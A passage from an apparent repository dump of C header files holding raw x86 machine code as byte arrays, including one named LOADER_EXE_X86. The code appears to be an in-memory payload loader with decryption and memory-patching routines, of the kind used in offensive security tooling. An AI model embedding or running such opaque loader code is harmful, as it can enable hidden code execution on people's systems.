0x2b, 0xc5, 0x8d, 0x74, 0x24, 0x14, \n  0x50, 0x03, 0xf5, 0x6a, 0x00, 0x56, 0xe8, 0xfc, 0x03, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0xc6, 0x06, 0x80, 0x83, 0xfd, 0x0c, 0x72, 0x21, 0x53, 0x8d, \n  0x44, 0x24, 0x18, 0x57, 0x50, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x6a, 0x10, \n  0x33, 0xf8, 0x33, 0xda, 0x8d, 0x44, 0x24, 0x24, 0x6a, 0x00, 0x50, 0xe8, \n  0xd3, 0x03, 0x00, 0x00, 0x83, 0xc4, 0x18, 0x8b, 0x44, 0x24, 0x10, 0x8b, \n  0x74, 0x24, 0x2c, 0xc1, 0xe0, 0x03, 0x46, 0x89, 0x44, 0x24, 0x20, 0x89, \n  0x74, 0x24, 0x2c, 0x53, 0x8d, 0x44, 0x24, 0x18, 0x57, 0x50, 0xe8, 0x21, \n  0x00, 0x00, 0x00, 0x33, 0xf8, 0x83, 0xc4, 0x0c, 0x8b, 0x44, 0x24, 0x10, \n  0x33, 0xda, 0x33, 0xed, 0x85, 0xf6, 0x0f, 0x84, 0x62, 0xff, 0xff, 0xff, \n  0x8b, 0xc7, 0x8b, 0xd3, 0x5f, 0x5e, 0x5d, 0x5b, 0x83, 0xc4, 0x14, 0xc3, \n  0x83, 0xec, 0x10, 0x8b, 0x44, 0x24, 0x18, 0x8b, 0x54, 0x24, 0x1c, 0x53, \n  0x55, 0x56, 0x8b, 0x74, 0x24, 0x20, 0x33, 0xdb, 0x57, 0x8d, 0x7c, 0x24, \n  0x10, 0xa5, 0xa5, 0xa5, 0xa5, 0x8b, 0x4c, 0x24, 0x14, 0x8b, 0x74, 0x24, \n  0x1c, 0x8b, 0x6c, 0x24, 0x18, 0x8b, 0x7c, 0x24, 0x10, 0x89, 0x4c, 0x24, \n  0x28, 0x8b, 0xce, 0xc1, 0xc8, 0x08, 0x8b, 0x74, 0x24, 0x28, 0x03, 0xc2, \n  0xc1, 0xce, 0x08, 0x33, 0xc7, 0x03, 0xf7, 0xc1, 0xc2, 0x03, 0x33, 0xf3, \n  0xc1, 0xc7, 0x03, 0x33, 0xd0, 0x89, 0x6c, 0x24, 0x28, 0x33, 0xfe, 0x8b, \n  0xe9, 0x43, 0x83, 0xfb, 0x1b, 0x72, 0xd6, 0x5f, 0x5e, 0x5d, 0x5b, 0x83, \n  0xc4, 0x10, 0xc3, 0x8b, 0x54, 0x24, 0x10, 0x83, 0xec, 0x14, 0x53, 0x8b, \n  0x5c, 0x24, 0x20, 0x55, 0x8b, 0x6c, 0x24, 0x28, 0x85, 0xd2, 0x0f, 0x84, \n  0xec, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x8d, 0x4b, 0x0f, 0x40, 0x89, 0x4c, \n  0x24, 0x2c, 0x2b, 0xc3, 0x56, 0x89, 0x44, 0x24, 0x0c, 0x57, 0x8d, 0x44, \n  0x24, 0x14, 0x3b, 0xc1, 0x77, 0x04, 0x8d, 0x44, 0x24, 0x23, 0x8b, 0xf3, \n  0x8d, 0x7c, 0x24, 0x14, 0x33, 0xc9, 0xa5, 0xa5, 0xa5, 0xa5, 0x8b, 0x74, \n  0x24, 0x28, 0x8b, 0x04, 0x8e, 0x31, 0x44, 0x8c, 0x14, 0x41, 0x83, 0xf9, \n  0x04, 0x72, 0xf3, 0x8b, 0x74, 0x24, 0x20, 0x8b, 0x44, 0x24, 0x1c, 0x8b, \n  0x7c, 0x24, 0x18, 0x8b, 0x4c, 0x24, 0x14, 0xc7, 0x44, 0x24, 0x30, 0x10, \n  0x00, 0x00, 0x00, 0x03, 0xcf, 0x03, 0xc6, 0xc1, 0xc7, 0x05, 0x33, 0xf9, \n  0xc1, 0xc6, 0x08, 0x33, 0xf0, 0xc1, 0xc1, 0x10, 0x03, 0xc7, 0x03, 0xce, \n  0xc1, 0xc7, 0x07, 0xc1, 0xc6, 0x0d, 0x33, 0xf8, 0x33, 0xf1, 0xc1, 0xc0, \n  0x10, 0x83, 0x6c, 0x24, 0x30, 0x01, 0x75, 0xd7, 0x8b, 0x5c, 0x24, 0x28, \n  0x89, 0x4c, 0x24, 0x14, 0x33, 0xc9, 0x89, 0x74, 0x24, 0x20, 0x89, 0x7c, \n  0x24, 0x18, 0x89, 0x44, 0x24, 0x1c, 0x8b, 0x04, 0x8b, 0x31, 0x44, 0x8c, \n  0x14, 0x41, 0x83, 0xf9, 0x04, 0x72, 0xf3, 0x6a, 0x10, 0x5e, 0x3b, 0xd6, \n  0x8b, 0xca, 0x0f, 0x47, 0xce, 0x85, 0xc9, 0x74, 0x15, 0x8d, 0x7c, 0x24, \n  0x14, 0x8b, 0xf5, 0x2b, 0xfd, 0x8b, 0xd9, 0x8a, 0x04, 0x37, 0x30, 0x06, \n  0x46, 0x83, 0xeb, 0x01, 0x75, 0xf5, 0x8b, 0x5c, 0x24, 0x10, 0x2b, 0xd1, \n  0x03, 0xe9, 0x8b, 0x4c, 0x24, 0x34, 0x80, 0x01, 0x01, 0x75, 0x08, 0x49, \n  0x8d, 0x04, 0x0b, 0x85, 0xc0, 0x7f, 0xf3, 0x8b, 0x5c, 0x24, 0x2c, 0x8d, \n  0x4b, 0x0f, 0x85, 0xd2, 0x0f, 0x85, 0x28, 0xff, 0xff, 0xff, 0x5f, 0x5e, \n  0x5d, 0x5b, 0x83, 0xc4, 0x14, 0xc3, 0x83, 0xec, 0x14, 0x8b, 0x4c, 0x24, \n  0x18, 0x83, 0x64, 0x24, 0x10, 0x00, 0x53, 0x55, 0x8b, 0x6c, 0x24, 0x24, \n  0x8a, 0x01, 0x56, 0x57, 0x88, 0x45, 0x00, 0x83, 0xcf, 0xff, 0x8d, 0x45, \n  0x01, 0x33, 0xf6, 0x89, 0x44, 0x24, 0x18, 0x33, 0xdb, 0x8d, 0x41, 0x01, \n  0x89, 0x5c, 0x24, 0x10, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, \n  0x50, 0xe8, 0x67, 0x01, 0x00, 0x00, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x32, \n  0x01, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xe8, 0x54, 0x01, 0x00, \n  0x00, 0x85, 0xc0, 0x8d, 0x44, 0x24, 0x18, 0x59, 0x50, 0x74, 0x7d, 0xe8, \n  0x45, 0x01, 0x00, 0x00, 0x59, 0x85, 0xc0, 0x74, 0x37, 0x6a, 0x04, 0x33, \n  0xf6, 0x5b, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xe8, 0x31, 0x01, 0x00, 0x00, \n  0x59, 0x8d, 0x34, 0x70, 0x83, 0xeb, 0x01, 0x75, 0xed, 0x8b, 0x54, 0x24, \n  0x18, 0x85, 0xf6, 0x74, 0x0a, 0x8b, 0xc2, 0x2b, 0xc6, 0x8a, 0x00, 0x88, \n  0x02, 0xeb, 0x03, 0xc6, 0x02, 0x00, 0x8b, 0x5c, 0x24, 0x10, 0x42, 0xe9, \n  0xef, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x14, 0x8b, 0x54, 0x24, 0x18, \n  0x0f, 0xb6, 0x38, 0x40, 0x8b, 0xcf, 0x89, 0x44, 0x24, 0x14, 0x83, 0xe1, \n  0x01, 0x83, 0xc1, 0x02, 0xd1, 0xef, 0x74, 0x14, 0x8b, 0xf2, 0x2b, 0xf7, \n  0x8a, 0x06, 0x88, 0x02, 0x42, 0x46, 0x83, 0xe9, 0x01, 0x75, 0xf5, 0xe9, \n  0xa4, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x43, 0x89, 0x5c, 0x24, 0x10, 0xe9, \n  0x9c, 0x00, 0x00, 0x00, 0xe8, 0xff, 0x00, 0x00, 0x00, 0x8b, 0xd0, 0x59, \n  0x85, 0xf6, 0x75, 0x2b, 0x83, 0xfa, 0x02, 0x75, 0x26, 0x8d, 0x44, 0x24, \n  0x14, 0x50, 0xe8, 0xe9, 0x00, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x1c, 0x8b, \n  0xf0, 0x59, 0x85, 0xf6, 0x74, 0x76, 0x8b, 0xca, 0x2b, 0xcf, 0x8a, 0x01, \n  0x88, 0x02, 0x42, 0x41, 0x83, 0xee, 0x01, 0x75, 0xf5, 0xeb, 0x61, 0x8b, \n  0x4c, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, 0x83, 0xf6, 0x01, 0x2b, 0xd6, \n  0xc1, 0xe2, 0x08, 0x0f, 0xb6, 0x39, 0x81, 0xc7, 0x00, 0xfe, 0xff, 0xff, \n  0x03, 0xfa, 0x41, 0x50, 0x89, 0x4c, 0x24, 0x18, 0xe8, 0xa7, 0x00, 0x00, \n  0x00, 0x59, 0x8b, 0xc8, 0x81, 0xff, 0x00, 0x7d, 0x00, 0x00, 0x72, 0x01, \n  0x41, 0x8b, 0x54, 0x24, 0x18, 0x8d, 0x41, 0x01, 0x81, 0xff, 0x00, 0x05, \n  0x00, 0x00, 0x0f, 0x42, 0xc1, 0x81, 0xff, 0x80, 0x00, 0x00, 0x00, 0x8d, \n  0x70, 0x02, 0x0f, 0x43, 0xf0, 0x85, 0xf6, 0x74, 0x13, 0x8b, 0xca, 0x2b, \n  0xcf, 0x8a, 0x01, 0x88, 0x02, 0x42, 0x41, 0x83, 0xee, 0x01, 0x75, 0xf5, \n  0x89, 0x54, 0x24, 0x18, 0x33, 0xf6, 0x46, 0xeb, 0x18, 0x8b, 0x4c, 0x24, \n  0x14, 0x8b, 0x54, 0x24, 0x18, 0x8a, 0x01, 0x88, 0x02, 0x42, 0x41, 0x89, \n  0x4c, 0x24, 0x14, 0x33, 0xf6, 0x89, 0x54, 0x24, 0x18, 0x85, 0xdb, 0x0f, \n  0x84, 0x9b, 0xfe, 0xff, 0xff, 0x5f, 0x5e, 0x2b, 0xd5, 0x5d, 0x8b, 0xc2, \n  0x5b, 0x83, 0xc4, 0x14, 0xc3, 0x56, 0x8b, 0x74, 0x24, 0x08, 0x8b, 0x4e, \n  0x0c, 0x8d, 0x56, 0x08, 0x8d, 0x41, 0xff, 0x89, 0x46, 0x0c, 0x85, 0xc9, \n  0x75, 0x13, 0x8b, 0x0e, 0x0f, 0xb6, 0x01, 0x89, 0x02, 0x8d, 0x41, 0x01, \n  0x89, 0x06, 0xc7, 0x46, 0x0c, 0x07, 0x00, 0x00, 0x00, 0x8b, 0x02, 0x5e, \n  0x8d, 0x0c, 0x00, 0xc1, 0xe8, 0x07, 0x89, 0x0a, 0x83, 0xe0, 0x01, 0xc3, \n  0x56, 0x33, 0xf6, 0x46, 0xff, 0x74, 0x24, 0x08, 0xe8, 0xbc, 0xff, 0xff, \n  0xff, 0xff, 0x74, 0x24, 0x0c, 0x8d, 0x34, 0x70, 0xe8, 0xb0, 0xff, 0xff, \n  0xff, 0x59, 0x59, 0x85, 0xc0, 0x75, 0xe5, 0x8b, 0xc6, 0x5e, 0xc3, 0x8b, \n  0x54, 0x24, 0x0c, 0x8b, 0x44, 0x24, 0x04, 0x56, 0x8b, 0xf0, 0x85, 0xd2, \n  0x74, 0x13, 0x57, 0x8b, 0x7c, 0x24, 0x10, 0x2b, 0xf8, 0x8a, 0x0c, 0x37, \n  0x88, 0x0e, 0x46, 0x83, 0xea, 0x01, 0x75, 0xf5, 0x5f, 0x5e, 0xc3, 0x8a, \n  0x44, 0x24, 0x08, 0x8b, 0x4c, 0x24, 0x0c, 0x57, 0x8b, 0x7c, 0x24, 0x08, \n  0xf3, 0xaa, 0x8b, 0x44, 0x24, 0x08, 0x5f, 0xc3, 0x8b, 0x44, 0x24, 0x04, \n  0x8b, 0x4c, 0x24, 0x08, 0x53, 0x8a, 0x10, 0x84, 0xd2, 0x74, 0x0e, 0x8a, \n  0x19, 0x84, 0xdb, 0x74, 0x08, 0x3a, 0xd3, 0x75, 0x04, 0x40, 0x41, 0xeb, \n  0xec, 0x0f, 0xbe, 0x00, 0x0f, 0xbe, 0x09, 0x2b, 0xc1, 0x5b, 0xc3, 0x8b, \n  0x54, 0x24, 0x04, 0x8b, 0x4c, 0x24, 0x08, 0x53, 0x8a, 0x02, 0x84, 0xc0, \n  0x74, 0x13, 0x8a, 0x19, 0x84, 0xdb, 0x74, 0x0d, 0x80, 0xcb, 0x20, 0x0c, \n  0x20, 0x3a, 0xc3, 0x75, 0x04, 0x42, 0x41, 0xeb, 0xe7, 0x0f, 0xbe, 0x02, \n  0x0f, 0xbe, 0x09, 0x2b, 0xc1, 0x5b, 0xc3};\n\n"
        },
        {
          "name": "loader_exe_x86.h",
          "type": "blob",
          "size": 71.125,
          "content": "\nunsigned char LOADER_EXE_X86[] = {\n  0x81, 0xec, 0xd4, 0x02, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, \n  0xe4, 0x02, 0x00, 0x00, 0x33, 0xdb, 0x57, 0x8b, 0xfb, 0x39, 0x9e, 0x38, \n  0x02, 0x00, 0x00, 0x0f, 0x84, 0xea, 0x00, 0x00, 0x00, 0xff, 0x76, 0x2c, \n  0xff, 0x76, 0x28, 0xff, 0xb6, 0x8c, 0x00, 0x00, 0x00, 0xff, 0xb6, 0x88, \n  0x00, 0x00, 0x00, 0x56, 0xe8, 0x45, 0x28, 0x00, 0x00, 0x8b, 0xf8, 0x83, \n  0xc4, 0x14, 0x85, 0xff, 0x0f, 0x84, 0xc0, 0x00, 0x00, 0x00, 0x53, 0x53, \n  0x56, 0xe8, 0x2d, 0x26, 0x00, 0x00, 0x8b, 0xc8, 0xb8, 0xd7, 0x22, 0x40, \n  0x00, 0x2d, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc8, 0x51, 0x53, 0x53, 0xff, \n  0xd7, 0xff, 0x76, 0x2c, 0x8b, 0xf8, 0xff, 0x76, 0x28, 0xff, 0xb6, 0x0c, \n  0x02, 0x00, 0x00, 0xff, 0xb6, 0x08, 0x02, 0x00, 0x00, 0x56, 0xe8, 0x03, \n  0x28, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x89, 0x44, 0x24, 0x28, 0xff, 0x76, \n  0x28, 0xff, 0xb6, 0xa4, 0x00, 0x00, 0x00, 0xff, 0xb6, 0xa0, 0x00, 0x00, \n  0x00, 0x56, 0xe8, 0xe7, 0x27, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x8b, 0xd8, \n  0xff, 0x76, 0x28, 0xff, 0xb6, 0xac, 0x00, 0x00, 0x00, 0xff, 0xb6, 0xa8, \n  0x00, 0x00, 0x00, 0x56, 0xe8, 0xcd, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x3c, \n  0x8b, 0xe8, 0x6a, 0x00, 0xff, 0x56, 0x38, 0x83, 0x7c, 0x24, 0x10, 0x00, \n  0x89, 0x44, 0x24, 0x14, 0x74, 0x4c, 0x85, 0xdb, 0x74, 0x48, 0x85, 0xed, \n  0x74, 0x44, 0x8d, 0x44, 0x24, 0x18, 0xc7, 0x44, 0x24, 0x18, 0x07, 0x00, \n  0x01, 0x00, 0x50, 0xff, 0xd5, 0x50, 0xff, 0xd3, 0x8b, 0x86, 0x38, 0x02, \n  0x00, 0x00, 0x03, 0x44, 0x24, 0x14, 0x83, 0xa4, 0x24, 0xdc, 0x00, 0x00, \n  0x00, 0xfc, 0x89, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x18, 0x6a, 0x00, 0x50, 0xff, 0x54, 0x24, 0x18, 0xeb, 0x0c, 0x83, 0xc8, \n  0xff, 0xeb, 0x09, 0x56, 0xe8, 0xc6, 0x11, 0x00, 0x00, 0x59, 0x8b, 0xc7, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0xd4, 0x02, 0x00, 0x00, 0xc3, 0x8b, \n  0x44, 0x24, 0x04, 0x83, 0xc0, 0x04, 0xf0, 0xff, 0x00, 0x8b, 0x00, 0xc2, \n  0x04, 0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x08, 0x00, 0x56, 0x57, \n  0xe8, 0x3e, 0x25, 0x00, 0x00, 0x8b, 0x74, 0x24, 0x10, 0xb9, 0xad, 0x11, \n  0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x01, 0xe8, 0x23, 0x25, 0x00, 0x00, 0xb9, 0x1f, 0x11, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x04, 0xe8, 0x10, \n  0x25, 0x00, 0x00, 0xb9, 0x0c, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, 0xfd, 0x24, 0x00, 0x00, 0xb9, 0x2e, \n  0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, \n  0xe8, 0xea, 0x24, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x5f, 0x89, 0x41, 0x10, 0x8b, 0x44, 0x24, 0x08, \n  0x83, 0x66, 0x04, 0x00, 0x89, 0x46, 0x08, 0x5e, 0xc3, 0x8b, 0x4c, 0x24, \n  0x0c, 0x85, 0xc9, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x4d, \n  0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x33, 0xd2, 0x56, 0x8b, 0x74, 0x24, 0x0c, \n  0x57, 0x8b, 0x7e, 0x08, 0x8b, 0x84, 0x97, 0x30, 0x08, 0x00, 0x00, 0x3b, \n  0x04, 0x93, 0x75, 0x08, 0x42, 0x83, 0xfa, 0x04, 0x75, 0xee, 0xeb, 0x14, \n  0x33, 0xd2, 0x8b, 0x84, 0x97, 0xf0, 0x08, 0x00, 0x00, 0x3b, 0x04, 0x93, \n  0x75, 0x10, 0x42, 0x83, 0xfa, 0x04, 0x75, 0xee, 0x89, 0x31, 0xf0, 0xff, \n  0x46, 0x04, 0x33, 0xc0, 0xeb, 0x08, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, \n  0x00, 0x80, 0x5f, 0x5e, 0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x4c, 0x24, 0x04, \n  0x83, 0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x04, 0x48, 0xc2, 0x04, 0x00, \n  0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0xf6, 0x45, 0x10, 0x02, \n  0x56, 0x8b, 0x75, 0x08, 0x57, 0x74, 0x15, 0x8b, 0x7d, 0x18, 0x85, 0xff, \n  0x74, 0x1b, 0x8b, 0x46, 0x1c, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x04, 0x8b, \n  0x46, 0x1c, 0x89, 0x07, 0xf6, 0x45, 0x10, 0x01, 0x74, 0x19, 0x8b, 0x7d, \n  0x14, 0x85, 0xff, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x0d, \n  0x83, 0xc6, 0x14, 0x56, 0x8b, 0x06, 0xff, 0x50, 0x04, 0x89, 0x37, 0x33, \n  0xc0, 0x5f, 0x5e, 0x5d, 0xc2, 0x14, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x8b, \n  0x40, 0x2c, 0xff, 0x50, 0x54, 0x8b, 0x4c, 0x24, 0x08, 0x89, 0x01, 0x33, \n  0xc0, 0xc2, 0x08, 0x00, 0x56, 0x57, 0xe8, 0xf4, 0x23, 0x00, 0x00, 0x8b, \n  0x74, 0x24, 0x10, 0xb9, 0xbe, 0x13, 0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x01, 0xe8, 0xd9, 0x23, \n  0x00, 0x00, 0xb9, 0x1f, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x04, 0xe8, 0xc6, 0x23, 0x00, 0x00, 0xb9, 0x0c, 0x12, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, \n  0xb3, 0x23, 0x00, 0x00, 0xb9, 0x6b, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, 0xe8, 0xa0, 0x23, 0x00, 0x00, 0xb9, \n  0x21, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x10, 0xe8, 0x8d, 0x23, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x14, 0xe8, 0x7a, 0x23, 0x00, \n  0x00, 0xb9, 0xb9, 0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x18, 0xe8, 0x67, 0x23, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x1c, 0xe8, 0x54, \n  0x23, 0x00, 0x00, 0xb9, 0x6e, 0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x20, 0xe8, 0x41, 0x23, 0x00, 0x00, 0xb9, 0x69, \n  0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x24, \n  0xe8, 0x2e, 0x23, 0x00, 0x00, 0xb9, 0x69, 0x13, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x5f, 0x89, 0x41, 0x28, 0x8b, 0x44, 0x24, 0x08, \n  0x83, 0x66, 0x04, 0x00, 0x89, 0x46, 0x2c, 0x5e, 0xc3, 0x33, 0xc0, 0xc2, \n  0x04, 0x00, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x2c, 0x33, 0xc0, 0x56, 0x6a, \n  0x20, 0x50, 0x89, 0x45, 0xf4, 0x89, 0x45, 0xf8, 0x89, 0x45, 0xfc, 0x8d, \n  0x45, 0xd4, 0x50, 0xe8, 0x8b, 0x29, 0x00, 0x00, 0x8b, 0x75, 0x0c, 0x8d, \n  0x4d, 0xd4, 0x83, 0xc4, 0x0c, 0x8b, 0x06, 0x51, 0x56, 0xff, 0x50, 0x0c, \n  0x85, 0xc0, 0x75, 0x12, 0x8b, 0x06, 0x8d, 0x4d, 0xfc, 0x51, 0x8d, 0x4d, \n  0xf8, 0x51, 0x8d, 0x4d, 0xf4, 0x51, 0x56, 0xff, 0x50, 0x10, 0x33, 0xc0, \n  0x5e, 0xc9, 0xc2, 0x08, 0x00, 0x33, 0xc0, 0xc2, 0x0c, 0x00, 0x8b, 0x4c, \n  0x24, 0x0c, 0x85, 0xc9, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, \n  0x6c, 0x8b, 0x54, 0x24, 0x04, 0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x56, 0x57, \n  0x8b, 0x7a, 0x2c, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0x30, 0x08, 0x00, 0x00, \n  0x3b, 0x04, 0xb3, 0x75, 0x08, 0x46, 0x83, 0xfe, 0x04, 0x75, 0xee, 0xeb, \n  0x14, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0xe0, 0x08, 0x00, 0x00, 0x3b, 0x04, \n  0xb3, 0x75, 0x0e, 0x46, 0x83, 0xfe, 0x04, 0x75, 0xee, 0x89, 0x11, 0xf0, \n  0xff, 0x42, 0x04, 0xeb, 0x1d, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0xf0, 0x08, \n  0x00, 0x00, 0x3b, 0x04, 0xb3, 0x75, 0x13, 0x46, 0x83, 0xfe, 0x04, 0x75, \n  0xee, 0x8d, 0x42, 0x08, 0x89, 0x01, 0xf0, 0xff, 0x42, 0x0c, 0x33, 0xc0, \n  0xeb, 0x08, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, 0x00, 0x80, 0x5f, 0x5e, \n  0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x44, 0x24, 0x18, 0x83, 0x20, 0x00, 0x33, \n  0xc0, 0xc2, 0x18, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x0f, 0xaf, 0x44, 0x24, \n  0x08, 0xc3, 0x8b, 0x44, 0x24, 0x14, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc2, \n  0x14, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x03, 0x44, 0x24, 0x08, 0xc3, 0x51, \n  0x53, 0x56, 0x8b, 0x74, 0x24, 0x10, 0x8d, 0x86, 0x54, 0x03, 0x00, 0x00, \n  0x50, 0x56, 0xe8, 0x0a, 0x22, 0x00, 0x00, 0x8b, 0xd8, 0x59, 0x59, 0x85, \n  0xdb, 0x75, 0x06, 0x40, 0xe9, 0xd5, 0x00, 0x00, 0x00, 0x55, 0x57, 0x6a, \n  0x00, 0x8d, 0x86, 0xc8, 0x05, 0x00, 0x00, 0x50, 0x53, 0x56, 0xe8, 0x88, \n  0x22, 0x00, 0x00, 0x8b, 0xe8, 0x83, 0xc4, 0x10, 0x85, 0xed, 0x0f, 0x84, \n  0xb2, 0x00, 0x00, 0x00, 0xbf, 0x48, 0x14, 0x40, 0x00, 0x81, 0xef, 0x3c, \n  0x14, 0x40, 0x00, 0x0f, 0x88, 0xa1, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x18, 0x50, 0x6a, 0x40, 0x57, 0x55, 0xff, 0x56, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0x8d, 0x00, 0x00, 0x00, 0x57, 0xe8, 0xa8, 0x21, 0x00, 0x00, 0xb9, \n  0x3c, 0x14, 0x40, 0x00, 0x81, 0xe9, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc1, \n  0x50, 0x55, 0xe8, 0x0c, 0x28, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, \n  0x24, 0x10, 0x50, 0xff, 0x74, 0x24, 0x1c, 0x57, 0x55, 0xff, 0x56, 0x48, \n  0x6a, 0x00, 0x8d, 0x86, 0xd8, 0x05, 0x00, 0x00, 0x50, 0x53, 0x56, 0xe8, \n  0x1b, 0x22, 0x00, 0x00, 0x8b, 0xe8, 0x83, 0xc4, 0x10, 0x85, 0xed, 0x74, \n  0x49, 0xbf, 0x5e, 0x14, 0x40, 0x00, 0xbb, 0x52, 0x14, 0x40, 0x00, 0x2b, \n  0xfb, 0x78, 0x3b, 0x8d, 0x44, 0x24, 0x18, 0x50, 0x6a, 0x40, 0x57, 0x55, \n  0xff, 0x56, 0x48, 0x85, 0xc0, 0x74, 0x2b, 0x57, 0xe8, 0x46, 0x21, 0x00, \n  0x00, 0x81, 0xeb, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc3, 0x50, 0x55, 0xe8, \n  0xaf, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x10, 0x50, \n  0xff, 0x74, 0x24, 0x1c, 0x57, 0x55, 0xff, 0x56, 0x48, 0x33, 0xc0, 0x40, \n  0xeb, 0x02, 0x33, 0xc0, 0x5f, 0x5d, 0x5e, 0x5b, 0x59, 0xc3, 0x55, 0x8b, \n  0xec, 0x51, 0x56, 0x8b, 0x75, 0x08, 0x57, 0x8d, 0x86, 0x68, 0x03, 0x00, \n  0x00, 0x50, 0x56, 0xe8, 0x0d, 0x21, 0x00, 0x00, 0x6a, 0x00, 0x8d, 0x8e, \n  0xe8, 0x05, 0x00, 0x00, 0x51, 0x50, 0x56, 0xe8, 0x9b, 0x21, 0x00, 0x00, \n  0x8b, 0xf8, 0x83, 0xc4, 0x18, 0x85, 0xff, 0x74, 0x34, 0x8d, 0x45, 0x08, \n  0x50, 0x6a, 0x40, 0x6a, 0x04, 0x57, 0xff, 0x56, 0x48, 0x85, 0xc0, 0x74, \n  0x24, 0x6a, 0x04, 0x8d, 0x86, 0x0d, 0x06, 0x00, 0x00, 0x50, 0x57, 0xe8, \n  0x43, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x45, 0xfc, 0x50, 0xff, \n  0x75, 0x08, 0x6a, 0x04, 0x57, 0xff, 0x56, 0x48, 0x33, 0xc0, 0x40, 0xeb, \n  0x02, 0x33, 0xc0, 0x5f, 0x5e, 0xc9, 0xc3, 0x81, 0xec, 0xec, 0x02, 0x00, \n  0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0xfc, 0x02, 0x00, 0x00, 0x8d, \n  0x44, 0x24, 0x34, 0x57, 0x6a, 0x3c, 0x33, 0xed, 0x33, 0xdb, 0x21, 0x5c, \n  0x24, 0x24, 0xbf, 0x00, 0x03, 0x60, 0x04, 0x55, 0x50, 0xe8, 0x21, 0x27, \n  0x00, 0x00, 0x83, 0xc4, 0x0c, 0xc7, 0x44, 0x24, 0x38, 0x3c, 0x00, 0x00, \n  0x00, 0x8d, 0x84, 0x24, 0xf8, 0x01, 0x00, 0x00, 0xb9, 0x04, 0x01, 0x00, \n  0x00, 0x89, 0x44, 0x24, 0x48, 